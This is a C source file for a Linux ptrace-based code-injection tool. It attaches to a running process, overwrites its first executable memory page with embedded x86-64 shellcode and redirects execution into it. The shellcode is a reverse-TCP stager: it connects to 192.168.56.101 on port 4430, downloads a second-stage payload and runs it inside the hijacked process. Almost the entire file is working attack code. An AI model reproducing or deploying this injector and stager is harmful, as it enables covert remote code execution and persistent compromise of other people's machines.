#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

#define PAGESIZE 4096

struct addr_struct {
    void *beg_addr;
    void *end_addr;
};

void find_write_address(pid_t pid, struct addr_struct *write_addr)
{
    FILE *fp = NULL;
    char line[1024];
    void *baddr, *eaddr;
    char perms[5];
    char str[20];
    char filename[30];

    sprintf(filename, "/proc/%d/maps", pid);
    
    if ((fp = fopen(filename, "r")) == NULL)
    {
	perror("error finding maps file for process");
	exit(1);
    }

    while (fgets(line, 1024, fp) != NULL)
    {
	sscanf(line, "%lx-%lx %s %*s %s %*d", &baddr, &eaddr, perms, str);

	if (strstr(perms, "x") != NULL)
		break;
    }

    write_addr->beg_addr = baddr;
    write_addr->end_addr = eaddr;
    fclose(fp);
    return;
}

int backup_data(pid_t pid, void *dst, const void *src, int len)
{
    unsigned char *s = (unsigned char *)src;
    unsigned char *d = (unsigned char *)dst;
    unsigned long word;
    while (len > 0)
    {
	word = ptrace(PTRACE_PEEKTEXT, pid, (long *)s, NULL);
	if (word == 1)
	    return 1;
	*(long *)d = word;
	s += sizeof(long);
	d += sizeof(long);
	len -= sizeof(long);
    }
    return 0;
}

int inject_data(pid_t pid, unsigned long long addr, void *data, int len)
{
    long word = 0;
    int i = 0;

    for (i = 0; i < len; i += sizeof(word), word = 0)
    {
	memcpy(&word, data + i, sizeof(word));
	if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1)
	{
	    perror("PTRACE_POKETEXT");
	    return 1;
	}
    }
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2)
	exit(1);
    
    int status;
    struct addr_struct w_addr;
    char backup[PAGESIZE];
    struct user_regs_struct oldregs, regs;

    memset(backup, '\0', PAGESIZE);

    pid_t pid = (pid_t)atoi(argv[1]);
    
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
    {
	perror("PTRACE_ATTACH");
	exit(-1);
    }
    printf("attached to process, waiting..\n");
    
    waitpid(pid, &status, WUNTRACED);
    printf("WSTOPSIG = %d\n", WSTOPSIG(status));

    
    if (ptrace(PTRACE_GETREGS, pid, NULL, &oldregs) == -1)
    {
	perror("PTRACE_GETREGS");
	exit(-1);
    }

    memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
    
    find_write_address(pid, &w_addr);
    
    //PTRACE_PEEKTEXT backup data in section
    backup_data(pid, backup, w_addr.beg_addr, PAGESIZE);

    unsigned char payload[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x11\x4e\xc0\xa8"
"\x38\x65\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6\xcc\x90\x90\x90\x90\x90";

    //exit
//    unsigned char payload[] =
//    "\x55\x48\x89\xe5\x48\xc7\xc0\x00\x00\x00\x00\x48\xc7\xc3\x00\x00\x00\x00\xcd\x80\xb8\x00\x00\x00\x00\x5d\xc3\xcc\x90\x90\x90\x90";

    int PAYLOADSZ = 136;
    //int PAYLOADSZ = 32;

    //PTRACE_POKETEXT
    long data = 0;
    if ((data = ptrace(PTRACE_PEEKTEXT, pid, w_addr.beg_addr, NULL)) == -1)
    {
	perror("PTRACE_PEEKTEXT");
	exit(-1);
    }
    printf("data = %lx\n", data);
    
    data = 0;
    inject_data(pid, (unsigned long long)w_addr.beg_addr, payload, PAYLOADSZ);
    if ((data = ptrace(PTRACE_PEEKTEXT, pid, w_addr.beg_addr, NULL)) == -1)
    {
        perror("PTRACE_PEEKTEXT");
        exit(-1);
    }
    printf("data = %lx\n", data);
    
    regs.rip = (unsigned long long)w_addr.beg_addr;
    regs.rip += 2;
    
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1)
    {
	perror("PTRACE_SETREGS");
	exit(-1);
    }
    
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    printf("executing shellcode, waiting for signal\n");
    waitpid(pid, &status, WUNTRACED);
    if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP)
	printf("SIGTRAP received!\n");
    printf("WSTOPSIG = %d\n", WSTOPSIG(status));
    
    inject_data(pid, (unsigned long long)w_addr.beg_addr, backup, PAGESIZE);
    if (ptrace(PTRACE_SETREGS, pid, NULL, &oldregs) == -1)
    {
        perror("PTRACE_SETREGS");
        exit(-1);
    }

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}


